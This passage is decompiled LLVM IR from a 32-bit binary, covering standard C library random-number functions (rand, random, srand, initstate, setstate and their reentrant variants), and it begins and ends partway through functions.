dec_label_pc_8050bee:                             ; preds = %dec_label_pc_8050bd4, %dec_label_pc_8050bee
  br label %dec_label_pc_8050bee

; uselistorder directives
  uselistorder i32 %v1_8050ba3, { 2, 1, 0 }
  uselistorder i32 %v1_8050b06, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 1, 6, 7, 8, 9, 10, 11, 12, 14, 13, 0 }
  uselistorder i8 3, { 0, 4, 3, 1, 2 }
  uselistorder i8* @global_var_805e700.236, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050bee, { 1, 0 }
  uselistorder label %dec_label_pc_8050bdd, { 1, 0 }
  uselistorder label %dec_label_pc_8050b67, { 1, 0 }
  uselistorder label %dec_label_pc_8050b2f, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8050bf4 = call i32 @random()
  ret i32 %v0_8050bf4

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050bfc = load i32, i32* @ebx, align 4
  store i32 %v0_8050bfc, i32* %stack_var_-4, align 4
  %v2_8050c0a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050c0a, i32* @ebx, align 4
  %v2_8050c0f = call i32 @__pthread_return_void(i32 %v2_8050c0a, i32 134550743)
  %v1_8050c1b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.237 to i32))
  %v2_8050c22 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050c2c = call i32 @__GI_random_r(i32* nonnull @global_var_80583b8, i32 %v2_8050c22)
  store i32 ptrtoint (i32* @global_var_80583b8 to i32), i32* @eax, align 4
  %v2_8050c36 = call i32 @__pthread_return_void(i32 %v2_8050c0a, i32 1)
  %v3_8050c3b = load i32, i32* %stack_var_-8, align 4
  %v2_8050c42 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c42, i32* @ebx, align 4
  ret i32 %v3_8050c3b
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8050c55 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050c55, i32* @eax, align 4
  %v2_8050c5a = call i32 @__pthread_return_void(i32 %v2_8050c55, i32 134550743)
  %v1_8050c66 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.237 to i32))
  %v0_8050c72 = load i32, i32* bitcast (i32** @global_var_80583c0.240 to i32*), align 64
  store i32 %v0_8050c72, i32* @ebx, align 4
  %v3_8050c7c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_80583b8)
  %v2_8050c84 = icmp slt i32 %v3_8050c7c, 0
  br i1 %v2_8050c84, label %dec_label_pc_8050c8b, label %dec_label_pc_8050c88

dec_label_pc_8050c88:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_80583bc.241 to i32), i32* @esi, align 4
  br label %dec_label_pc_8050c8b

dec_label_pc_8050c8b:                             ; preds = %entry, %dec_label_pc_8050c88
  store i32 %v2_8050c55, i32* @eax, align 4
  %v2_8050c94 = call i32 @__pthread_return_void(i32 %v2_8050c55, i32 1)
  %v0_8050c99 = load i32, i32* @esi, align 4
  ret i32 %v0_8050c99

; uselistorder directives
  uselistorder label %dec_label_pc_8050c8b, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050cb0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050cb0, i32* @ebx, align 4
  %v2_8050cb5 = call i32 @__pthread_return_void(i32 %v2_8050cb0, i32 134550743)
  %v1_8050cc1 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.237 to i32))
  %v0_8050ccb = load i32, i32* bitcast (i32** @global_var_80583c0.240 to i32*), align 64
  store i32 %v0_8050ccb, i32* @esi, align 4
  %v4_8050cdd = inttoptr i32 %arg2 to i32*
  %v5_8050cdd = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8050cdd, i32 %arg3, i32 ptrtoint (i32* @global_var_80583b8 to i32))
  store i32 %v5_8050cdd, i32* @eax, align 4
  %v2_8050ce8 = call i32 @__pthread_return_void(i32 %v2_8050cb0, i32 1)
  ret i32 ptrtoint (i32** @global_var_80583bc.241 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050cf8 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cf8, i32* %stack_var_-4, align 4
  %v2_8050d06 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050d06, i32* @ebx, align 4
  %v2_8050d0b = call i32 @__pthread_return_void(i32 %v2_8050d06, i32 134550743)
  %v1_8050d17 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80583a0.237 to i32))
  %v2_8050d27 = sext i32 %arg1 to i64
  %v3_8050d27 = call i32 @srandom_r(i64 %v2_8050d27, i32 ptrtoint (i32* @global_var_80583b8 to i32))
  store i32 ptrtoint (i32* @global_var_80583b8 to i32), i32* @eax, align 4
  %v2_8050d31 = call i32 @__pthread_return_void(i32 %v2_8050d06, i32 1)
  %v2_8050d39 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d39, i32* @ebx, align 4
  ret i32 %v2_8050d31

; uselistorder directives
  uselistorder i32* @global_var_80583b8, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80583b8 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8050d3f = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8050d4b = add i32 %arg1, 4
  store i32 %v1_8050d4b, i32* %esi.global-to-local, align 4
  %v1_8050d4e = add i32 %tmp4, 12
  %v2_8050d4e = inttoptr i32 %v1_8050d4e to i32*
  %v3_8050d4e = load i32, i32* %v2_8050d4e, align 4
  store i32 %v3_8050d4e, i32* %ecx.global-to-local, align 4
  %v1_8050d51 = add i32 %tmp4, 8
  %v2_8050d51 = inttoptr i32 %v1_8050d51 to i32*
  %v3_8050d51 = load i32, i32* %v2_8050d51, align 4
  %v1_8050d54 = icmp eq i32 %v3_8050d4e, 0
  %v1_8050d56 = icmp eq i1 %v1_8050d54, false
  br i1 %v1_8050d56, label %dec_label_pc_8050d61, label %dec_label_pc_8050d58

dec_label_pc_8050d58:                             ; preds = %entry
  %v1_8050d58 = add i32 %v3_8050d51, -4
  %v2_8050d58 = inttoptr i32 %v1_8050d58 to i32*
  store i32 0, i32* %v2_8050d58, align 4
  br label %dec_label_pc_8050d71

dec_label_pc_8050d61:                             ; preds = %entry
  %v1_8050d61 = add i32 %tmp4, 4
  %v2_8050d61 = inttoptr i32 %v1_8050d61 to i32*
  %v3_8050d61 = load i32, i32* %v2_8050d61, align 4
  %v2_8050d64 = sub i32 %v3_8050d61, %v3_8050d51
  %v2_8050d66 = sdiv i32 %v2_8050d64, 4
  %v3_8050d69 = mul i32 %v2_8050d66, 5
  %v2_8050d6c = add i32 %v3_8050d69, %v3_8050d4e
  store i32 %v2_8050d6c, i32* %eax.global-to-local, align 4
  %v2_8050d6e = add i32 %v3_8050d51, -4
  %v3_8050d6e = inttoptr i32 %v2_8050d6e to i32*
  store i32 %v2_8050d6c, i32* %v3_8050d6e, align 4
  br label %dec_label_pc_8050d71

dec_label_pc_8050d71:                             ; preds = %dec_label_pc_8050d58, %dec_label_pc_8050d61
  %v0_8050d71 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050d71 = add i32 %v0_8050d71, -4
  %v2_8050d71 = inttoptr i32 %v1_8050d71 to i32*
  %v3_8050d71 = load i32, i32* %v2_8050d71, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8050d79 = ashr i32 %v3_8050d71, 31
  %v2_8050d7a = zext i32 %v3_8050d71 to i64
  %v4_8050d7a = zext i32 %v1_8050d79 to i64
  %v5_8050d7a = mul nuw i64 %v4_8050d7a, 4294967296
  %v6_8050d7a = or i64 %v5_8050d7a, %v2_8050d7a
  %v8_8050d7a = sdiv i64 %v6_8050d7a, 5
  %v9_8050d7a = trunc i64 %v8_8050d7a to i32
  store i32 %v9_8050d7a, i32* %eax.global-to-local, align 4
  %v10_8050d7a = srem i64 %v6_8050d7a, 5
  %v11_8050d7a = trunc i64 %v10_8050d7a to i32
  %v6_8050d7f = icmp ugt i32 %v11_8050d7a, 4
  br i1 %v6_8050d7f, label %dec_label_pc_8050dbf, label %dec_label_pc_8050d81

dec_label_pc_8050d81:                             ; preds = %dec_label_pc_8050d71
  %v1_8050d81 = mul i32 %v11_8050d7a, 4
  %v2_8050d81 = add i32 %v1_8050d81, ptrtoint (i32* @global_var_8056e14.242 to i32)
  %v3_8050d81 = inttoptr i32 %v2_8050d81 to i32*
  %v4_8050d81 = load i32, i32* %v3_8050d81, align 4
  store i32 %v4_8050d81, i32* %ecx.global-to-local, align 4
  %v2_8050d88 = add i32 %v1_8050d81, ptrtoint (i32* @global_var_8056e00.243 to i32)
  %v3_8050d88 = inttoptr i32 %v2_8050d88 to i32*
  %v4_8050d88 = load i32, i32* %v3_8050d88, align 4
  store i32 %v4_8050d88, i32* %ebp.global-to-local, align 4
  %v1_8050d8f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d8f = add i32 %v1_8050d8f, 16
  %v3_8050d8f = inttoptr i32 %v2_8050d8f to i32*
  store i32 %v4_8050d81, i32* %v3_8050d8f, align 4
  %v0_8050d92 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050d92 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d92 = add i32 %v1_8050d92, 20
  %v3_8050d92 = inttoptr i32 %v2_8050d92 to i32*
  store i32 %v0_8050d92, i32* %v3_8050d92, align 4
  %v1_8050d95 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050d95 = add i32 %v1_8050d95, 12
  %v3_8050d95 = inttoptr i32 %v2_8050d95 to i32*
  store i32 %v11_8050d7a, i32* %v3_8050d95, align 4
  %v1_8050d98 = icmp eq i32 %v11_8050d7a, 0
  br i1 %v1_8050d98, label %dec_label_pc_8050db2, label %dec_label_pc_8050d9c

dec_label_pc_8050d9c:                             ; preds = %dec_label_pc_8050d81
  %v0_8050d9c = load i32, i32* %esi.global-to-local, align 4
  %v1_8050d9c = add i32 %v0_8050d9c, -4
  %v2_8050d9c = inttoptr i32 %v1_8050d9c to i32*
  %v3_8050d9c = load i32, i32* %v2_8050d9c, align 4
  %v1_8050d9f = ashr i32 %v3_8050d9c, 31
  %v0_8050da0 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050da0 = zext i32 %v3_8050d9c to i64
  %v4_8050da0 = zext i32 %v1_8050d9f to i64
  %v5_8050da0 = mul nuw i64 %v4_8050da0, 4294967296
  %v6_8050da0 = or i64 %v5_8050da0, %v2_8050da0
  %v7_8050da0 = zext i32 %v0_8050da0 to i64
  %v8_8050da0 = sdiv i64 %v6_8050da0, %v7_8050da0
  %v9_8050da0 = trunc i64 %v8_8050da0 to i32
  %v2_8050da2 = mul i32 %v9_8050da0, 4
  %v3_8050da2 = add i32 %v2_8050da2, %v0_8050d9c
  %v1_8050da5 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050da5 = add i32 %v1_8050da5, %v9_8050da0
  store i32 %v2_8050da5, i32* %eax.global-to-local, align 4
  %v1_8050da7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050da7 = add i32 %v1_8050da7, 4
  %v3_8050da7 = inttoptr i32 %v2_8050da7 to i32*
  store i32 %v3_8050da2, i32* %v3_8050da7, align 4
  %v0_8050daa = load i32, i32* %eax.global-to-local, align 4
  %v1_8050daa = ashr i32 %v0_8050daa, 31
  %v0_8050dab = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050dab = zext i32 %v0_8050daa to i64
  %v4_8050dab = zext i32 %v1_8050daa to i64
  %v5_8050dab = mul nuw i64 %v4_8050dab, 4294967296
  %v6_8050dab = or i64 %v5_8050dab, %v2_8050dab
  %v7_8050dab = zext i32 %v0_8050dab to i64
  %v8_8050dab = sdiv i64 %v6_8050dab, %v7_8050dab
  %v9_8050dab = trunc i64 %v8_8050dab to i32
  store i32 %v9_8050dab, i32* %eax.global-to-local, align 4
  %v10_8050dab = srem i64 %v6_8050dab, %v7_8050dab
  %v11_8050dab = trunc i64 %v10_8050dab to i32
  %v0_8050dad = load i32, i32* %esi.global-to-local, align 4
  %v2_8050dad = mul i32 %v11_8050dab, 4
  %v3_8050dad = add i32 %v2_8050dad, %v0_8050dad
  %v1_8050db0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050db0 = inttoptr i32 %v1_8050db0 to i32*
  store i32 %v3_8050dad, i32* %v2_8050db0, align 4
  br label %dec_label_pc_8050db2

dec_label_pc_8050db2:                             ; preds = %dec_label_pc_8050d81, %dec_label_pc_8050d9c
  %v0_8050db2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050db2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050db2 = mul i32 %v1_8050db2, 4
  %v3_8050db2 = add i32 %v2_8050db2, %v0_8050db2
  store i32 %v3_8050db2, i32* %eax.global-to-local, align 4
  %v1_8050db5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050db5 = add i32 %v1_8050db5, 8
  %v3_8050db5 = inttoptr i32 %v2_8050db5 to i32*
  store i32 %v0_8050db2, i32* %v3_8050db5, align 4
  %v0_8050db8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050db8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050db8 = add i32 %v1_8050db8, 24
  %v3_8050db8 = inttoptr i32 %v2_8050db8 to i32*
  store i32 %v0_8050db8, i32* %v3_8050db8, align 4
  br label %dec_label_pc_8050dcd

dec_label_pc_8050dbf:                             ; preds = %dec_label_pc_8050d71
  %v1_8050dbf = call i32 @__errno_location(i32 %v0_8050d3f)
  store i32 %v1_8050dbf, i32* %eax.global-to-local, align 4
  %v1_8050dc4 = inttoptr i32 %v1_8050dbf to i32*
  store i32 22, i32* %v1_8050dc4, align 4
  br label %dec_label_pc_8050dcd

dec_label_pc_8050dcd:                             ; preds = %dec_label_pc_8050db2, %dec_label_pc_8050dbf
  %storemerge = phi i32 [ -1, %dec_label_pc_8050dbf ], [ 0, %dec_label_pc_8050db2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d3f, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8050db2, { 1, 0 }
  uselistorder i32 %v11_8050d7a, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8050dcd, { 1, 0 }
  uselistorder label %dec_label_pc_8050db2, { 1, 0 }
  uselistorder label %dec_label_pc_8050d71, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050dd8 = load i32, i32* @ebx, align 4
  store i32 %v0_8050dd8, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8050de1 = add i32 %tmp2, 8
  %v2_8050de1 = inttoptr i32 %v1_8050de1 to i32*
  %v3_8050de1 = load i32, i32* %v2_8050de1, align 4
  store i32 %v3_8050de1, i32* %esi.global-to-local, align 4
  %v1_8050de4 = add i32 %tmp2, 12
  %v2_8050de4 = inttoptr i32 %v1_8050de4 to i32*
  %v3_8050de4 = load i32, i32* %v2_8050de4, align 4
  %v4_8050de4 = icmp eq i32 %v3_8050de4, 0
  %v1_8050de8 = icmp eq i1 %v4_8050de4, false
  br i1 %v1_8050de8, label %dec_label_pc_8050e01, label %dec_label_pc_8050dea

dec_label_pc_8050dea:                             ; preds = %entry
  %v2_8050dea = inttoptr i32 %v3_8050de1 to i32*
  %v3_8050dea = load i32, i32* %v2_8050dea, align 4
  %v5_8050dea = mul i32 %v3_8050dea, 1103515245
  %v1_8050df0 = add i32 %v5_8050dea, 12345
  %v1_8050df5 = urem i32 %v1_8050df0, -2147483648
  store i32 %v1_8050df5, i32* %eax.global-to-local, align 4
  store i32 %v1_8050df5, i32* %v2_8050dea, align 4
  %v0_8050dfc = load i32, i32* %eax.global-to-local, align 4
  %v1_8050dfc = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050dfc = inttoptr i32 %v1_8050dfc to i32*
  store i32 %v0_8050dfc, i32* %v2_8050dfc, align 4
  br label %dec_label_pc_8050e2d

dec_label_pc_8050e01:                             ; preds = %entry
  %v1_8050e01 = add i32 %tmp2, 4
  %v2_8050e01 = inttoptr i32 %v1_8050e01 to i32*
  %v3_8050e01 = load i32, i32* %v2_8050e01, align 4
  store i32 %v3_8050e01, i32* %ecx.global-to-local, align 4
  %v2_8050e04 = load i32, i32* %arg1, align 4
  store i32 %v2_8050e04, i32* %edx.global-to-local, align 4
  %v1_8050e06 = add i32 %tmp2, 24
  %v2_8050e06 = inttoptr i32 %v1_8050e06 to i32*
  %v3_8050e06 = load i32, i32* %v2_8050e06, align 4
  store i32 %v3_8050e06, i32* %edi.global-to-local, align 4
  %v1_8050e09 = inttoptr i32 %v3_8050e01 to i32*
  %v2_8050e09 = load i32, i32* %v1_8050e09, align 4
  store i32 %v2_8050e09, i32* %eax.global-to-local, align 4
  %v1_8050e0b = inttoptr i32 %v2_8050e04 to i32*
  %v2_8050e0b = load i32, i32* %v1_8050e0b, align 4
  %v4_8050e0b = add i32 %v2_8050e0b, %v2_8050e09
  store i32 %v4_8050e0b, i32* %v1_8050e0b, align 4
  %v0_8050e0d = load i32, i32* %edx.global-to-local, align 4
  %v1_8050e0d = inttoptr i32 %v0_8050e0d to i32*
  %v2_8050e0d = load i32, i32* %v1_8050e0d, align 4
  %v1_8050e0f = add i32 %v0_8050e0d, 4
  store i32 %v1_8050e0f, i32* %edx.global-to-local, align 4
  %v2_8050e12 = udiv i32 %v2_8050e0d, 2
  %v1_8050e14 = load i32, i32* %edi.global-to-local, align 4
  %v7_8050e14 = icmp ult i32 %v1_8050e0f, %v1_8050e14
  %v1_8050e16 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050e16 = inttoptr i32 %v1_8050e16 to i32*
  store i32 %v2_8050e12, i32* %v2_8050e16, align 4
  %v0_8050e19 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050e19 = add i32 %v0_8050e19, 4
  store i32 %v1_8050e19, i32* %eax.global-to-local, align 4
  br i1 %v7_8050e14, label %dec_label_pc_8050e22, label %dec_label_pc_8050e1e

dec_label_pc_8050e1e:                             ; preds = %dec_label_pc_8050e01
  %v0_8050e1e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050e1e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050e28

dec_label_pc_8050e22:                             ; preds = %dec_label_pc_8050e01
  %v1_8050e22 = load i32, i32* %edi.global-to-local, align 4
  %v7_8050e22 = icmp ult i32 %v1_8050e19, %v1_8050e22
  br i1 %v7_8050e22, label %dec_label_pc_8050e28, label %dec_label_pc_8050e26

dec_label_pc_8050e26:                             ; preds = %dec_label_pc_8050e22
  %v0_8050e26 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050e26, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e28

dec_label_pc_8050e28:                             ; preds = %dec_label_pc_8050e22, %dec_label_pc_8050e1e, %dec_label_pc_8050e26
  %v0_8050e28 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050e28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e28 = inttoptr i32 %v1_8050e28 to i32*
  store i32 %v0_8050e28, i32* %v2_8050e28, align 4
  %v0_8050e2a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e2a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e2a = add i32 %v1_8050e2a, 4
  %v3_8050e2a = inttoptr i32 %v2_8050e2a to i32*
  store i32 %v0_8050e2a, i32* %v3_8050e2a, align 4
  br label %dec_label_pc_8050e2d

dec_label_pc_8050e2d:                             ; preds = %dec_label_pc_8050dea, %dec_label_pc_8050e28
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050e2f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050e2f, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050df5, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050e2d, { 1, 0 }
  uselistorder label %dec_label_pc_8050e28, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8050e34 = load i32, i32* @ebp, align 4
  %v0_8050e35 = load i32, i32* @edi, align 4
  %v0_8050e36 = load i32, i32* @esi, align 4
  %v0_8050e37 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_8050e42 = trunc i64 %arg1 to i32
  store i32 %v4_8050e42, i32* %eax.global-to-local, align 4
  %v1_8050e46 = add i32 %arg2, 12
  %v2_8050e46 = inttoptr i32 %v1_8050e46 to i32*
  %v3_8050e46 = load i32, i32* %v2_8050e46, align 4
  store i32 %v3_8050e46, i32* %edx.global-to-local, align 4
  %v6_8050e4c = icmp ugt i32 %v3_8050e46, 4
  br i1 %v6_8050e4c, label %dec_label_pc_8050ec0, label %dec_label_pc_8050e4e

dec_label_pc_8050e4e:                             ; preds = %entry
  %v1_8050e4e = add i32 %arg2, 8
  %v2_8050e4e = inttoptr i32 %v1_8050e4e to i32*
  %v3_8050e4e = load i32, i32* %v2_8050e4e, align 4
  store i32 %v3_8050e4e, i32* %ebx.global-to-local, align 4
  %v1_8050e51 = icmp eq i32 %v4_8050e42, 0
  %v1_8050e53 = icmp eq i1 %v1_8050e51, false
  br i1 %v1_8050e53, label %dec_label_pc_8050e57, label %dec_label_pc_8050e55

dec_label_pc_8050e55:                             ; preds = %dec_label_pc_8050e4e
  %v1_8050e55 = and i32 %v4_8050e42, -256
  %v2_8050e55 = or i32 %v1_8050e55, 1
  store i32 %v2_8050e55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e57

dec_label_pc_8050e57:                             ; preds = %dec_label_pc_8050e4e, %dec_label_pc_8050e55
  %v0_8050e57 = phi i32 [ %v4_8050e42, %dec_label_pc_8050e4e ], [ %v2_8050e55, %dec_label_pc_8050e55 ]
  %v2_8050e57 = inttoptr i32 %v3_8050e4e to i32*
  store i32 %v0_8050e57, i32* %v2_8050e57, align 4
  %v1_8050e59 = icmp eq i32 %v3_8050e46, 0
  br i1 %v1_8050e59, label %dec_label_pc_8050ebe, label %dec_label_pc_8050e5d

dec_label_pc_8050e5d:                             ; preds = %dec_label_pc_8050e57
  %v0_8050e5d = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050e5d, i32* %edx.global-to-local, align 4
  %v0_8050e5f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050e5f, i32* %ecx.global-to-local, align 4
  %v0_8050e61 = load i32, i32* @esi, align 4
  %v1_8050e61 = add i32 %v0_8050e61, 16
  %v2_8050e61 = inttoptr i32 %v1_8050e61 to i32*
  %v3_8050e61 = load i32, i32* %v2_8050e61, align 4
  store i32 %v3_8050e61, i32* %eax.global-to-local, align 4
  %v4_8050e69 = sext i32 %v3_8050e61 to i64
  store i64 %v4_8050e69, i64* %stack_var_-40, align 8
  %v5_8050e9b27 = icmp sgt i32 %v3_8050e61, 1
  br i1 %v5_8050e9b27, label %dec_label_pc_8050e6e, label %dec_label_pc_8050e9d

dec_label_pc_8050e6e:                             ; preds = %dec_label_pc_8050e5d, %dec_label_pc_8050e6e.dec_label_pc_8050e6e_crit_edge
  %v0_8050e92 = phi i32 [ %v0_8050e92.pre, %dec_label_pc_8050e6e.dec_label_pc_8050e6e_crit_edge ], [ %v0_8050e5f, %dec_label_pc_8050e5d ]
  %v0_8050e6e = phi i32 [ %v0_8050e6e.pre, %dec_label_pc_8050e6e.dec_label_pc_8050e6e_crit_edge ], [ %v0_8050e5d, %dec_label_pc_8050e5d ]
  %v0_8050e9528 = phi i32 [ %v0_8050e98.pre, %dec_label_pc_8050e6e.dec_label_pc_8050e6e_crit_edge ], [ 1, %dec_label_pc_8050e5d ]
  %v1_8050e75 = ashr i32 %v0_8050e6e, 31
  %v2_8050e76 = zext i32 %v0_8050e6e to i64
  %v4_8050e76 = zext i32 %v1_8050e75 to i64
  %v5_8050e76 = mul nuw i64 %v4_8050e76, 4294967296
  %v6_8050e76 = or i64 %v5_8050e76, %v2_8050e76
  %v8_8050e76 = sdiv i64 %v6_8050e76, 127773
  %v9_8050e76 = trunc i64 %v8_8050e76 to i32
  %v10_8050e76 = srem i64 %v6_8050e76, 127773
  %v3_8050e7c = mul nsw i64 %v10_8050e76, 16807
  %v4_8050e7c = trunc i64 %v3_8050e7c to i32
  %v3_8050e82 = mul i32 %v9_8050e76, 2836
  store i32 %v3_8050e82, i32* %eax.global-to-local, align 4
  %v2_8050e88 = sub i32 %v4_8050e7c, %v3_8050e82
  %v13_8050e88 = icmp slt i32 %v2_8050e88, 0
  %v1_8050e8a = icmp eq i1 %v13_8050e88, false
  %v1_8050e8c = add i32 %v2_8050e88, 2147483647
  %v2_8050e88.v1_8050e8c = select i1 %v1_8050e8a, i32 %v2_8050e88, i32 %v1_8050e8c
  store i32 %v2_8050e88.v1_8050e8c, i32* %edx.global-to-local, align 4
  %v1_8050e92 = add i32 %v0_8050e92, 4
  store i32 %v1_8050e92, i32* %ecx.global-to-local, align 4
  %v1_8050e95 = add i32 %v0_8050e9528, 1
  store i32 %v1_8050e95, i32* @edi, align 4
  %v2_8050e96 = inttoptr i32 %v1_8050e92 to i32*
  store i32 %v2_8050e88.v1_8050e8c, i32* %v2_8050e96, align 4
  %v0_8050e98.pre = load i32, i32* @edi, align 4
  %v3_8050e98.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8050e98.pre to i32
  %v5_8050e9b = icmp slt i32 %v0_8050e98.pre, %extract.t12
  br i1 %v5_8050e9b, label %dec_label_pc_8050e6e.dec_label_pc_8050e6e_crit_edge, label %dec_label_pc_8050e98.dec_label_pc_8050e9d_crit_edge

dec_label_pc_8050e6e.dec_label_pc_8050e6e_crit_edge: ; preds = %dec_label_pc_8050e6e
  %v0_8050e6e.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8050e92.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050e6e

dec_label_pc_8050e98.dec_label_pc_8050e9d_crit_edge: ; preds = %dec_label_pc_8050e6e
  %v0_8050e9d.pre = load i32, i32* @esi, align 4
  %v0_8050ea0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e9d

dec_label_pc_8050e9d:                             ; preds = %dec_label_pc_8050e98.dec_label_pc_8050e9d_crit_edge, %dec_label_pc_8050e5d
  %v0_8050ea0 = phi i32 [ %v0_8050ea0.pre, %dec_label_pc_8050e98.dec_label_pc_8050e9d_crit_edge ], [ %v0_8050e5f, %dec_label_pc_8050e5d ]
  %v0_8050e9d = phi i32 [ %v0_8050e9d.pre, %dec_label_pc_8050e98.dec_label_pc_8050e9d_crit_edge ], [ %v0_8050e61, %dec_label_pc_8050e5d ]
  %v1_8050e9d = add i32 %v0_8050e9d, 20
  %v2_8050e9d = inttoptr i32 %v1_8050e9d to i32*
  %v3_8050e9d = load i32, i32* %v2_8050e9d, align 4
  store i32 %v3_8050e9d, i32* %eax.global-to-local, align 4
  %v2_8050ea0 = add i32 %v0_8050e9d, 4
  %v3_8050ea0 = inttoptr i32 %v2_8050ea0 to i32*
  store i32 %v0_8050ea0, i32* %v3_8050ea0, align 4
  %v0_8050ea3 = load i32, i32* %ebx.global-to-local, align 4
